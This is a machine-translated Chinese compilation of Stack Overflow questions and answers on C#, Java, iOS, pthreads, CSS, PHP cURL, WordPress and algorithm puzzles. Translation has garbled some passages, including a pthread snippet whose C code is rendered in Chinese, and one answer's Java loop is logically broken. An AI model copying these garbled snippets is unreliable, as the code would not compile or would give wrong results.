在我的项目中，我有不同的类似任务要执行。您可以让他们在地图上绘制形状。在我的项目中，我让他用户通过单击地图并在每次单击时添加一个标记来绘制形状，当他单击现有标记时，所有制造商形成一个封闭的多边形。然后您可以将其保存到数据库中。至于您上面提到的编辑部分，您可以将多边形的可编辑属性设置为 true 以让它们与多边形一起玩。

希望这对您的项目有所帮助。快乐编码！祝你好运

# c# - 我如何引用资源文件，这样我就不必更改文件的路径

> ID：13167311
> 
> 赞同：-2
> 
> 时间：2012-10-31T20:57:46.317
> 
> 标签：c#, visual-studio, resources

> **可能重复：**
> [如何在 .NET 中创建和使用资源](https://stackoverflow.com/questions/90697/how-to-create-and-use-resources-in-net)

我使用这段代码，但如果我从另一个地方运行它，显然是一条错误的路径。

```
string strPath = @"C:\Users\perdanny\Documents\Visual Studio 2010\Projects\PokerBlitz\PokerBlitz\Resources\Cards\" 
    + (suit * 13 + rank).ToString() + ".png"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:08:42.587

如果您尚未将文件添加到项目的资源中，您可以通过单击项目 -> 添加现有项目来执行此操作。然后在您的文件系统中找到该文件。您可以使用引用该文件

```
Properties.Resources.fileName 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:12:53.863

你可以使用这样的东西：

```
Application.StartupPath + (suit*13+rank).ToString() +".png"; 
```

可能您需要添加更多目录，例如 \PokerBlitz\Resources\Cards\ 我不确定。

[您可以在此处](http://msdn.microsoft.com/en-us/library/system.windows.forms.application.startuppath.aspx)阅读有关此主题的更多信息

# maven - 依赖关系的 Maven、NetBeans 平台、包装器模块和注释处理器

> ID：13167312
> 
> 赞同：0
> 
> 时间：2012-10-31T20:57:48.047
> 
> 标签：maven, netbeans-platform, annotation-processing

我有一个 Maven NetBeans 平台应用程序。它的一个模块是一个 java 项目 (jar) 的包装器，它向 Lookup 公开一些服务。在包装的项目中，我使用 maven-processor-plugin 来处理注释，以便所有内容都在 Lookup 中注册。我无法在包装模块上看到暴露的类。我尝试运行 maven-processor-plugin 但它被跳过，因为包装模块中没有源文件。就算有也解决不了问题。

[您可以在此处](https://bitbucket.org/javydreamercsw/simple-marauroa-rcp)获取代码，在 Marauroa Server Manager 项目的模块：jWrestling Wrapper 中。

包装模块的代码可以在[这里](https://bitbucket.org/javydreamercsw/jwrestling)找到。模块中的注释类工作正常。

有没有办法在项目的依赖项上执行注释处理器？我错过了一些明显的东西吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T05:11:01.143

包装好的 jar 项目不能包含 nb.org 注释。这些生成 META_INF/generated-layer.xml 文件，该文件只能从 MODULE jar 读取，而不是包装的非模块 jar

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-01T08:51:17.367

二进制依赖项包含一些源自 netbeans 的注释？你想通过maven插件处理它吗？那是行不通的。大多数（如果不是全部）netbeans 注释只是编译时的，这意味着它们是在编译时处理的，而不是保留在字节码中。所以只有 su 除了Netbeans注解（基于jdk 1.6注解处理器，你不需要处理器插件，编译插件就足够了。

# html - 找出帖子在 tumblr 上是否为私人帖子？

> ID：13167315
> 
> 赞同：0
> 
> 时间：2012-10-31T20:57:54.500
> 
> 标签：html, css, tumblr

如果 tumblr 上的帖子是私人的，我想在页面上添加一个“私人”图像。有什么办法可以找出来吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-01T14:20:33.013

[我在主题指南](http://www.tumblr.com/docs/en/custom_themes)中找不到任何变量，因此似乎无法使用特殊`class`或`id`值。

如果你想编程，你可以（我不太了解这些东西）使用知道“**状态”**[的 API](http://www.tumblr.com/docs/en/api/v2)：

 **> 表示帖子的当前状态
> 
> 状态是`published`,`queued`和`draft``private`

另一种（相当脏的）方法可能是使用 JavaScript 解析 URL 路径，因为私人帖子以`/private/`. 如果存在，您可以使用 JS 向元素添加`class`类似“private”的值。`body`**

# java - 为什么有些库与源代码和 javadoc jar 文件一起分发？

> ID：13167316
> 
> 赞同：2
> 
> 时间：2012-10-31T20:58:00.957
> 
> 标签：java, jar, distribution

我下载[了 apache 公共](http://commons.apache.org/io/)库。解压缩文件，我发现除了我需要的库之外还有多个其他 jar 文件 - `commons-io-2.4.jar`.

其他文件有什么用？他们只是压缩源代码、测试和文档以供参考吗？或者，是否有其他原因需要包含在分发中？如果它们只是带有 jar 扩展名的 zip 文件，为什么它们以 jar 扩展名分发？

![在此处输入图像描述](../Images/bbaebb5dd3f0aa2d38c15191bedacbb9.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:06:01.623

[maven](http://maven.apache.org/)可以自动生成这些 jar 并将其上传到服务器，其中包含源代码、javadoc、测试...... Maven 生成它们时带有 .jar 扩展名。可能它们是用 Maven 生成的。

例如，命令“mvn source:jar”生成 de sources.jar。[http://maven.apache.org/plugins/maven-source-plugin/](http://maven.apache.org/plugins/maven-source-plugin/)

# ios - 表格视图，静态单元格，更改单元格高度

> ID：13167317
> 
> 赞同：0
> 
> 时间：2012-10-31T20:58:01.597
> 
> 标签：ios, uitableview, heightforrowatindexpath

我知道使用动态 TableView，您可以使用... tableView:heightForRowAtIndexPath 设置单元格高度：

但是，如果我使用的是静态表格视图（不是动态的），带有部分，我想以编程方式将单元格的高度设置为 0。

```
-(CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath{

//used to set the height of a cell

CGFloat result;
switch(indexPath.section) {

    case 0:
    {
        //How do I get the ROW number in this section?
        result = 44;
        break;
    }

    case 1:
    {
        //this works if I want to set all of the rowels to this height.
        result = 250;
        break;
    } 
```

}

问题以另一种方式提出，如果我有 indexPath.section... 我该怎么做... indexPath.Section.row？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T23:10:01.473

你可以`indexpath.row`直接使用。不用写了`indexPath.Section.row`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-14T01:22:21.713

在 iOS 中，[NSIndexPath](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSIndexPath_Class/Reference/Reference.html)获得[了额外的职责](http://developer.apple.com/library/ios/#documentation/uikit/reference/NSIndexPath_UIKitAdditions/Reference/Reference.html)。这有点令人困惑，因为 Apple 有两个不同的文档。

如其他答案所述，您将获得：

获取部分索引

*   *截面*属性

获取行或项目的索引

*   *行*属性
*   *物品*属性

# c++ - 如何验证 pthread 函数是否开始执行

> ID：13167318
> 
> 赞同：0
> 
> 时间：2012-10-31T20:58:01.877
> 
> 标签：c++, multithreading, testing, pthreads, execution

例子：

```
无效开始（无效）
{
   pthread_create(&threadID, Null, run_thread_function,arguments);

   //有没有办法确保run_thread_function（基本上是新线程）是否启动   
   //从this(start)函数返回之前执行    

}

```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:01:15.550

检查返回码。

```
if ((retcode = pthread_create(&threadID, Null, run_thread_function,arguments)) != 0)
{
   //something went wrong
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-31T21:02:20.577

传递同步对象（condvar、事件或信号量）作为参数的一部分。在调用 pthread_create() 之后等待它。在线程中，在第一行发出信号，（或者在线程执行了它的初始化内容之后，如果这是你想要实现的）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-31T21:01:16.160

检查`pthread_create`函数的返回码是否有错误。

更新一些共享变量并从另一个线程测试它。请记住在更新共享变量时使用同步原语，例如互斥锁。

或者为了进行简单的测试，打印一些带有线程 ID 或其他类型标识符的消息。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-31T22:12:02.253

在 C++11 中，通过类型对象创建线程`std::thread`在新线程启动之前不会返回。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-02T00:11:43.390

如果`pthread_barrier_wait`您想确定您的新线程已经开始，请使用。

不过，我真的很怀疑那些非常关心这一点的代码。好像你在询问比赛条件。

请注意，我应该检查所有地方的返回值，而不是为了简洁明了。*叹*

```
#include <iostream>
#include <pthread.h>
#include <unistd.h>

void *newthread(void *vbarrier)
{
   pthread_barrier_t *barrier = static_cast<pthread_barrier_t *>(vbarrier);
   sleep(2);
   int err = pthread_barrier_wait(barrier);
   if ((err != 0) && (err != PTHREAD_BARRIER_SERIAL_THREAD)) {
      ::std::cerr << "Aiee! pthread_barrier_wait returned some sort of error!\n";
   } else {
      ::std::cerr << "I am the new thread!\n";
   }
   return 0;
}

int main()
{
   pthread_barrier_t barrier;
   pthread_barrier_init(&barrier, NULL, 2);
   pthread_t other;
   pthread_create(&other, NULL, newthread, &barrier);
   pthread_barrier_wait(&barrier);
   ::std::cerr << "Both I and the new thread reached the barrier.\n";
   pthread_join(other, NULL);
   return 0;
} 
```

C++11 没有障碍。但是在一定程度上，使用条件变量可以很容易地模拟障碍：

```
#include <thread>
#include <condition_variable>
#include <iostream>
#include <unistd.h>

void runthread(::std::mutex &m, ::std::condition_variable &v, bool &started)
{
   sleep(2);
   {
      ::std::unique_lock< ::std::mutex> lock(m);
      started = true;
      v.notify_one();
   }
   ::std::cerr << "I am the new thread!\n";
}

int main()
{
   ::std::mutex m;
   ::std::condition_variable v;
   bool started = false;
   ::std::thread newthread(runthread, ::std::ref(m), ::std::ref(v), ::std::ref(started));
   {
      ::std::unique_lock< ::std::mutex> lock(m);
      while (!started) {
         v.wait(lock);
      }
   }
   ::std::cerr << "Both I and the new thread are running.\n";
   newthread.join();
   return 0;
} 
```

# css - css背景渐变与css3中的背景图像在两个不同的类上

> ID：13167320
> 
> 赞同：2
> 
> 时间：2012-10-31T20:58:15.997
> 
> 标签：css, input

是否可以为同一元素在两个不同的类上定义背景图像和背景渐变？

```
input[type=password] {
    background-image: url(/images/icons/glyphicons_203_lock.png);
    background-size: 17px auto;
    background-position: 9px 5px;
}

.err input[name] {
    background: -moz-linear-gradient(top,  #ffdddd 0%, #ffeeee 100%);
} 
```

发生错误时会发生图标丢失。

如果有帮助的话，我会使用“less”，我想避免的是必须单独定义每个 .err 元素上的每个图标，这将是很多重复代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:02:21.417

您使用的方式，渐变将覆盖图像，因为渐变也是图像，因此您可以通过像这样分离图像和渐变来使用 CSS3 多个背景，它将为您提供图像和渐变

```
background-image: url('url'), -moz-linear-gradient(top, #ffdddd, #ffeeee); 
```

# email - CDOSys 与 SMTPsvg.Mailer

> ID：13167321
> 
> 赞同：0
> 
> 时间：2012-10-31T20:58:23.017
> 
> 标签：email, asp-classic

我有以下经典 ASP 代码来使用 SMTPsvg.Mailer 发送电子邮件：

```
Set Mailer = Server.CreateObject("SMTPsvg.Mailer")
Mailer.FromName   = "From Name"
Mailer.FromAddress= "someone@test.com"
Mailer.RemoteHost = "mail.test.com"
Mailer.AddRecipient "inquiry", "test@test.com"
Mailer.Subject    = "Contact Request" 
```

我正在尝试将其转换为使用 CDOsys，但根据此处的文档，CDOsys 对象似乎没有 FromName、RemoteHost 属性：

[http://msdn.microsoft.com/en-us/library/ms526367(v=exchg.10).aspx](http://msdn.microsoft.com/en-us/library/ms526367(v=exchg.10).aspx)

使用 CDOsys 时是否可能自动包含远程主机？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-01T02:08:31.487

对于发件人地址，您可以使用“发件人”属性指定发件人名称和地址，如下所示：

```
myMail.From="""Sender Name"" <email@sender.com>" 
```

请注意，名称用双引号括起来。

如果未指定邮件服务器，CDOSYS 将使用默认服务器（localhost，端口 25）。要指定不同的服务器，您需要使用 ConfigurationFields，如下所示：

```
myMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing")=2
myMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver")="smtp.server.com"
myMail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport")=25
myMail.Configuration.Fields.Update 
```

# visual-studio - VS 2012 IIS Express 8 - 无法启动 IIS Express Web 服务器

> ID：13167326
> 
> 赞同：4
> 
> 时间：2012-10-31T20:58:31.887
> 
> 标签：visual-studio, iis, visual-studio-2012, iis-express

我正在尝试在 IIS Express 8 中运行 MVC 4 项目（因为这显然是 VS 2012 附带的），每次我尝试从 VS 运行它时，都会出现以下错误。

无法启动 IIS Express Web 服务器。

14:53:48：错误：无法初始化 OLE

14:53:48：错误：无法初始化 OLE

通过 WebMatrix 启动 IIS Express 似乎工作正常。我已经尝试卸载并重新安装，但似乎没有任何效果。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-18T21:55:39.653

我不确定这会有所帮助，但它对我有用。卸载 IIS 后，确保删除 IISExpress 文件夹（在 Windows 7 上，该文件夹位于 My Documents\IISExpress 中）。这是 IIS 配置文件所在的位置，如果您在卸载后不删除它，新安装的 IIS 最终将使用旧的配置文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-27T17:05:19.333

我没有看到您遇到的 OLE 错误，但其他一切都相似......

检查事件视图，我看到预加载 .NET 4.0.30306 的 IIS 错误。所有配置文件都指向 4.0.30319。

但是......在我的 Windows/Microsoft.NET/Framework/（和 Framework64）下，我似乎安装了 v4.0.30306 的部分安装。

删除这两个 .30306 文件夹并重新启动为我修复了 IIS 启动问题。

# syslog - Gearmand 无法正常启动，返回“多次出现”

> ID：13167328
> 
> 赞同：0
> 
> 时间：2012-10-31T20:58:35.943
> 
> 标签：syslog, gearman

Gearmand 在我尝试重新启动它之前运行了大约一天，但它不会重新启动。获取以下内容并且系统日志中没有任何涉及齿轮人的内容。

```
~$ /etc/init.d/gearman-job-server stop && /etc/init.d/gearman-job-server start
 * Stopping Gearman Server gearmand                                                                                                                                                                         No /usr/sbin/gearmand found running; none killed.
                                                                                                                                                                                                     [ OK ]
 * Starting Gearman Server gearmand                                                                                                                                                                         multiple occurrences
                                                                                                                                                                                                     [fail]
 * Please take a look at the syslog 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-04T12:14:32.307

刚刚也有这个问题。我认为“多次出现”是指冲突的命令行开关

在我的情况下，我通过 --listen=127.0.0.1 以及 --listen=0.0.0.0 删除 127.0.0.1 解决了问题

# c - 预处理器命令（#if 已定义）在 CUDA 程序中不起作用？

> ID：13167330
> 
> 赞同：0
> 
> 时间：2012-10-31T20:59:02.370
> 
> 标签：c, cuda, c-preprocessor, nvcc

在此代码片段中，我希望 MatrixMultiplication() 方法中的“printf”命令显示其文本。它没有，即使“size”已在前一行声明并且“test”设置为 1。这是代码：

```
void MatrixMultiplication(float * M, float * N, float * P, int Width, int test)
{
        int size = Width * Width * sizeof(float);

        #if defined size
        if (test)
        {
                printf("Should be equal to %d.  Int size:%d", Width * Width * sizeof(float), size);
        }
        #endif
}

int main (int argc, char ** argv)
{

        // Omitted for brevity...

        int test = 1;                                                   

        // Omitted for brevity...

        MatrixMultiplication(hostM, hostN, reference, atoi(matrix_id), test);

        // Omitted for brevity...

} 
```

我正在使用以下命令进行编译：

```
nvcc -I/home/sbu/NVIDIA_GPU_Computing_SDK/C/common/inc -L/home/sbu/NVIDIA_GPU_Computing_SDK/C/lib -o matrixmul matrixmul.cu -lcutil_x86_64 
```

nvcc 是否有某些东西使这种“#if defined”命令不起作用？我之前在使用 gcc 的本机**C**和 C++ 代码中使用过这种语法，它工作得很好。

对这个问题的任何启发都会很棒！

这是关于 Pastebin 的完整代码：http: [//pastebin.com/SusnpgFc](http://pastebin.com/SusnpgFc)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:04:07.380

> 它没有，即使“大小”已在前一行声明

测试是否已定义具有该名称的`#if defined size`预处理器宏，它不检查是否在程序中声明了具有该名称的变量。

`#define size`只有当你有一个或`#define size some replacement tokens`之前，它才会评估为真。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:04:42.923

预处理是在编译之前完成的。所以当预处理器检查这个时：

```
#if defined size 
```

`size`没有在任何地方定义，所以它被替换为`0`. 因此，整个`if`代码段在传递给编译器之前不会被删除。

# java - 在 Java 中创建缓冲图像时数组索引超出范围

> ID：13167332
> 
> 赞同：0
> 
> 时间：2012-10-31T20:59:19.647
> 
> 标签：java, image, bufferedimage

我正在尝试处理图像文件并将其作为 Image 对象返回，但是当我调用 public static BufferedImage getImageFromArray(int[] data, int columns, int rows) 时，我在以下代码中得到了 ArrayIndexOutOfBoundsException。

我将以下像素颜色存储到名为“data”的数组中：

```
[255,6,65,78,99,100,25,0,45,66,88,190,88,76,50] 
```

我从一个看起来像这样的文本文件中解析出来：

```
255, 6, 65, 78, 99
100, 25, 0, 45, 66
88, 190, 88, 76, 50 
```

我正在尝试通过使用[BufferedImage](http://docs.oracle.com/javase/1.4.2/docs/api/java/awt/image/BufferedImage.htm)从这些数据生成图像，目前我正在用这个来打砖墙。根据上面的表结构将列和行传递给它。

```
 public static BufferedImage getImageFromArray(int[] data, int columns, int rows) {
    BufferedImage image = new BufferedImage(columns, rows, BufferedImage.TYPE_INT_RGB);
    WritableRaster raster = (WritableRaster) image.getData();
    raster.setPixels(0,0, columns, rows, data);
    image.setData(raster);
    return image;
} 
```

当我点击 raster.setPixels 调用时，我得到了一个 OOB 异常。这是否需要我缺少的不同数组或值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-01T02:29:53.280

这是我找到的解决方案，RGB 类型需要 3 个波段......因此要创建一个有效的数组：

```
private int[] imageArray(String fullFilePath, int rows, int columns) throws Exception{
    int picRows = rows;
    int picColumns = columns;
    data = getPixelData(fullFilePath);

    //3 bands in TYPE_INT_RGB
    int NUM_BANDS = 3;
    int[] arrayImage = new int[picRows * picColumns * NUM_BANDS];

    for (int i = 0; i < picRows; i++)
    {
        for (int j = 0; j < picColumns; j++) {
            for (int band = 0; band < NUM_BANDS; band++)
                for (int k = 0; k < data.length; k++)
                    arrayImage[((i * picRows) + j)*NUM_BANDS + band] = data[k];
        }
    }
    return arrayImage;
} 
```

# php - 在php的函数中使用cURL时未定义的变量

> ID：13167338
> 
> 赞同：1
> 
> 时间：2012-10-31T20:59:37.803
> 
> 标签：php, curl

我正在研究一个简单的 php 脚本，它将返回来自谷歌搜索特定字符串的搜索结果的数量（使用 cURL）。当我将代码保持在全局范围内时，一切正常，但是一旦创建函数，就会出现错误

```
Notice: Undefined variable: resultTagId in C:\wamp\www\tag.php on line 24
Notice: Trying to get property of non-object in C:\wamp\tag.php on line 24 
```

这是我的代码

```
<?php

$resultTagId = "resultStats"; 
$encodedNames = $_GET['names'];
$names=json_decode($encodedNames);

    getNumber($names[0]);

function getNumber($name) // before i used to set $name = $names[0] and everything worked fine
{
    $name = str_replace(" ", "+", trim($name));

    $url='http://www.google.com/search?q='.$name.'&ie=utf-8&oe=utf-8&aq=t';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec ($ch);
    curl_close ($ch);

    $dom = new DOMDocument();
    @$dom->loadHTML( $data );
    $resultsTag =  $dom->getElementById($resultTagId)->nodeValue;

    $results =  preg_replace("/[^0-9]/","" ,$resultsTag);
    echo $results;
}
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:01:43.180

有多种方法可以做到这一点（包括使用[全局](http://php.net/manual/en/language.variables.scope.php)变量，这往往会使事情变得混乱），但最好的方法是将变量作为参数传递。

更改函数的参数：

```
function getNumber($name, $tagId) { 
```

当你调用函数时，传递你的变量：

```
getNumber($names[0], $resultTagId) 
```

# algorithm - 奇数元素在奇数位置，偶数元素在偶数位置

> ID：13167341
> 
> 赞同：3
> 
> 时间：2012-10-31T21:00:04.310
> 
> 标签：algorithm

这是在一次采访中提出的问题。请提出一些看法。给定一个包含所有正整数的数组。您必须以奇数元素位于奇数位置，偶数元素位于偶数位置的方式排列元素。

PS。没有多余的空间。O(N) 解决方案

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-10-31T21:09:38.117

遍历偶数位置，直到找到奇数。遍历奇数位置，直到找到偶数（使用不同的索引）。交换两个数字，然后重复。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-01T01:20:45.120

您是否允许将数组的大小加倍？否则，这个问题没有意义。为什么？！？假设你得到一个充满奇数的数组，那么你能想到任何解决方案吗？不，那里没有。

因此，我假设您可以将数组的大小加倍。然后对于任何 i，将 i 元素 ( a(i) ) 放入位置 2*i 或 2*i +1 取决于 a(i) 是偶数还是奇数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:05:02.933

两个与给定数组大小相同的新数组 OddArray 和 EvenArray。遍历给定的数组并继续将所有奇数发送到 OddArray 并保持奇数位置和偶数到 EvenArray 保持数字在偶数位置。

效率为 O(n)，额外内存为 2n，其中 n 是原始数组的大小。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-08-29T07:29:01.460

```
list1 = [5, 7, 6, 8, 10, 3, 4, 9, 2, 1, 12]
odd_list = []
even_list = []
for i in range(len(list1)):
    if((list1[i] % 2) == 0):
        even_list.append(list1[i])
    else:
        odd_list.append(list1[i])
print(list1)
j = 0
k = 0
for i in range(0, len(list1)):
    if((i % 2 == 0) and (j < len(odd_list))):
        list1[i] = odd_list[j]
        j += 1
    elif(k < len(even_list)):
        list1[i] = even_list[k]
        k += 1
print(list1) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-08-24T09:25:27.340

```
//Putting even number on even position and odd number on odd position
package com.learnJava;

public class ArrangeArray {

    private int [] array={2,5,7,8,1,6,9};
    private int len=array.length;
    public static void main(String [] args)
    {
        ArrangeArray a=new ArrangeArray();
        a.print();
        a.arrange();
        a.print();

    }
    public  void print()
    {
        for(int i=0;i<array.length;i++)
        {
            System.out.print(array[i] + " ");

        }
        System.out.println();
    }
    public void arrange()
    {
        int oddinx=1;
        int evenidx=0;
        while(true)
        {
            while(evenidx<len && array[evenidx]%2==0)
            {
                evenidx+=2;
            }
            while(oddinx<len && array[oddinx]%2==1)
            {
                oddinx+=2;
            }
            if (evenidx < len && oddinx < len)
                swap (evenidx, oddinx);
            else
                break;

        }

    }
    public void swap(int a,int b)
    {
        int tmp=array[b];
        array[b]=array[a];
        array[a]=tmp;
    }
} 
```

# php - 如何在 WordPress 中仅显示自定义分类的最新类别中的帖子

> ID：13167342
> 
> 赞同：2
> 
> 时间：2012-10-31T21:00:04.860
> 
> 标签：php, wordpress, sorting, custom-taxonomy

我有一个自定义分类法，称为问题（如杂志问题），其类别以每期的标题命名。我创建了一个名为“当前问题”的页面，并在网站的主导航中添加了一个指向它的链接。

这是我现在在页面模板中的循环：

```
$categories = get_terms('issue', 'orderby=count&order=asc');
     foreach( $categories as $category ): 
     ?>
     <h3><?php echo $category->name; ?></h3>
     <?php
     $posts = get_posts(array(
     'post_type' => 'issue_posts',
     'taxonomy' => $category->taxonomy,
     'term' => $category->slug,
     'nopaging' => true,
     ));
     foreach($posts as $post): 
     setup_postdata($post); 
```

它确实对类别和帖子进行了适当的排序，但这会拉入所有类别的所有帖子。我需要该链接仅显示最近添加的类别。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T23:33:16.320

最近添加的术语将是具有最高 ID 的术语。获取按 ID 降序排列的单个术语，您将拥有最近添加的术语。

```
$args = array(
    'number' => 1,
    'orderby' => 'ID',
    'order' => 'DESC'
);

$recent_issue = get_terms( 'issue', $args ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:09:54.727

因为`categories`是`taxonomy`Wordpress 中的一个，所以没有与它们相关的日期来告诉您“最新”的日期是什么。如果您需要跟踪最近创建的类别是什么，您可以使用`created_term`Wordpress 源代码中的`/wp-includes/taxonomy.php`和 function `wp_insert_term()`：

```
do_action("created_term", $term_id, $tt_id, $taxonomy); 
```

类别的`$taxonomy`将是`category`（保存前检查），`$term_id`将是您的类别 ID。从与此操作挂钩的函数中，您可以调用`update_option('latest_category_id', $term_id);`它，然后稍后将其获取以`get_option('latest_category_id');`在您的`get_posts()`调用中使用。

# asp.net - 在 HTML 编辑器工具栏中隐藏按钮 (AjaxControlToolkit)

> ID：13167351
> 
> 赞同：0
> 
> 时间：2012-10-31T21:00:53.507
> 
> 标签：asp.net, css, ajax, asp.net-ajax

我正在尝试隐藏添加颜色的按钮，请参见图片。我尝试过使用 CSS，但我所做的只是打破页面并隐藏所有内容。

[http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/HTMLEditor/HTMLEditor.aspx](http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/HTMLEditor/HTMLEditor.aspx)

![在此处输入图像描述](../Images/89c06b41b0ff60ece55a3d83a67d824d.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T23:03:22.217

**详细信息：**以下内容应该可以解决您的问题。

**没有 Masterpage 的解决方案：**

```
<style type="text/css">
     #MainContent_ctl00_ctl01_FixedForeColor {display:none;}
     #MainContent_ctl00_ctl01_FixedBackColor {display:none;}  
</style> 
```

**母版页解决方案：**

```
<style type="text/css">
    #MainContent_Editor1_ctl01_FixedForeColor {display:none;}
    #MainContent_Editor1_ctl01_FixedBackColor {display:none;}
</style> 
```

**其他自定义方式**

[自定义 HTML 编辑器控件](http://www.asp.net/web-forms/tutorials/ajax-control-toolkit/htmleditor/how-do-i-use-the-html-editor-control-cs)

# ios - tableView:commitEditingStyle:forRowAtIndexPath: 怎么能用 nil indexPath 调用？

> ID：13167353
> 
> 赞同：11
> 
> 时间：2012-10-31T21:00:55.310
> 
> 标签：ios, uitableview

我终于找到了一个奇怪的崩溃。它是由使用indexPath`tableView:commitEditingStyle:forRowAtIndexPath:`调用引起的。`nil`但怎么可能呢？

```
- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath {
    if (editingStyle == UITableViewCellEditingStyleDelete) {
        // DEBUG
        if (indexPath == nil) {
            NSLog(@"Deleting row at nil indexPath in %@", self);
        }
        [self deleteItemAtIndexPath:indexPath fromTableView:tableView];
    }
} 
```

这是堆栈跟踪：

```
6    XXX     -[ListViewController tableView:commitEditingStyle:forRowAtIndexPath:] (ListViewController.m:427)
7    UIKit   -[UITableView(UITableViewInternal) animateDeletionOfRowWithCell:] + 85
8    UIKit   -[UIApplication sendAction:to:from:forEvent:] + 73
9    UIKit   -[UIApplication sendAction:toTarget:fromSender:forEvent:] + 31
10   UIKit   -[UIControl sendAction:to:forEvent:] + 45
11   UIKit   -[UIControl(Internal) _sendActionsForEvents:withEvent:] + 503
12   UIKit   -[UIApplication sendAction:to:from:forEvent:] + 73
13   UIKit   -[UIApplication sendAction:toTarget:fromSender:forEvent:] + 31
14   UIKit   -[UIControl sendAction:to:forEvent:] + 45
15   UIKit   -[UIControl(Internal) _sendActionsForEvents:withEvent:] + 503
16   UIKit   -[UIControl touchesEnded:withEvent:] + 489
17   UIKit   -[UIWindow _sendTouchesForEvent:] + 525
18   UIKit   -[UIApplication sendEvent:] + 381
19   UIKit   _UIApplicationHandleEvent + 6155
20   GraphicsServices    _PurpleEventCallback + 591
21   CoreFoundation  __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ + 15
22   CoreFoundation  __CFRunLoopDoSources0 + 213
23   CoreFoundation  __CFRunLoopRun + 647
24   CoreFoundation  CFRunLoopRunSpecific + 357
25   CoreFoundation  CFRunLoopRunInMode + 105
26   GraphicsServices    GSEventRunModal + 75
27   UIKit   UIApplicationMain + 1121
28   XXX     main (main.m:16)
29   XXX     start + 40 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2014-08-12T05:26:35.720

例外是由于 index 处存在数据，但 indexPath 已被删除。您需要删除索引处的数组对象。

尝试以下操作：

```
- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath 
   {
      if (editingStyle == UITableViewCellEditingStyleDelete) 
      {
         [self deleteItemAtIndexPath:indexPath fromTableView:tableView];
         NSMutableArray * tempArray = [yourDataArray mutableCopy];
        [tempArray removeObjectAtIndex: indexPath.row];
         yourDataArray = tempArray;
        [tableView reloadData];
      }
   } 
```

# objective-c - 使用单词验证正则表达式进行输入字符验证

> ID：13167354
> 
> 赞同：2
> 
> 时间：2012-10-31T21:00:55.793
> 
> 标签：objective-c, ios, regex, nsregularexpression

比方说，我有一个正则表达式来检查整个输入值的**验证**。例如，它是一个电子邮件输入框，当用户按 Enter 键时，我会检查它`^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}$`是否是有效的电子邮件地址。

我想要实现的是，我也想拦截输入的字符，并检查每个输入的字符，看看该字符是否也是有效字符。我可以通过添加一个额外的正则表达式来做到这一点，例如，`[A-Z0-9._%+-]` **但这不是我想要**的。

有没有办法从给定的正则表达式中**提取尽可能广泛的可接受字符？**那么在上面的示例中，我可以通过**编程**方式提取原始正则表达式（即） 定义的**所有有效字符**吗？`^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}$`

 **我将不胜感激任何帮助或提示。

PS这是用Objective-C编写的iOS项目。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-14T15:08:55.317

如果你不介意写半个正则表达式解析器，当然可以。您必须能够区分文字和元字符并展开/合并所有字符类（包括否定字符类和嵌套否定字符类，如果您的正则表达式支持它们）。

